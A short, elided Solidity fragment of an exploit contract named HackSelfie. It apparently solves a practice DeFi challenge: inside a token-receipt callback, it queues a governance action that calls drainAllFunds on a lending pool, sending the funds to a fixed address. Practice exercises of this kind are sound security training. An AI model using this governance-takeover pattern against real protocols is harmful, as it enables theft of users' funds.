...
contract HackSelfie {
    ...
    ISimpleGovernance gov = ISimpleGovernance(0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512);
    uint256 actionId;
    ...
    function receiveTokens(address token,uint256 amount) public {
        ...
        actionId = gov.queueAction(address(pool),abi.encodeWithSignature("drainAllFunds(address)",  0x70997970C51812dc3A010C7d01b50e0d17dc79C8) ,0);
